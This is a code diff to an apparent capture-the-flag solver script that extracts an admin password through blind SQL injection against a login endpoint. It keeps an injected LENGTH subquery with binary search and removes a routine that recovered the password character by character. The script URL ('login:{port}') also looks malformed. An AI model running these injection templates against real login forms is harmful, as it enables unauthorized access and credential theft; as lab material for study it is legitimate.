@@ -9,7 +9,7 @@ class Solver:
         self._chall_url = f"http://example.com/login:{port}"
         self._login_url = urljoin(self._chall_url, "login")
     # base HTTP methods
-    def _login(self, userid: str, userpassword: str) -> requests.Response:
+    def _login(self, userid: str, userpassword: str) -> bool:
         login_data = {
             "userid": userid,
             "userpassword": userpassword
@@ -33,24 +33,12 @@ class Solver:
         return mid
     # attack methods
     def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
-        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\") < {{val}})"
+        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
         pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
         return pw_len
-    def _find_password(self, user: str, pw_len: int) -> str:
-        pw = ''
-        for idx in range(1, pw_len+1):
-            query_tmpl = f"((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=\"{user}\") < CHAR({{val}}))"
-            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e))
-            print(f"{idx}. {pw}")
-        return pw
-    def solve(self) -> None:
-        # Find the length of admin password
+    def solve(self):
         pw_len = solver._find_password_length("admin")
-        print(f"Length of the admin password is: {pw_len}")
-        # Find the admin password
-        print("Finding password:")
-        pw = solver._find_password("admin", pw_len)
-        print(f"Password of the admin is: {pw}")
+        print(f"Length of admin password is: {pw_len}")
 if __name__ == "__main__":
     port = sys.argv[1]
     solver = Solver(port)
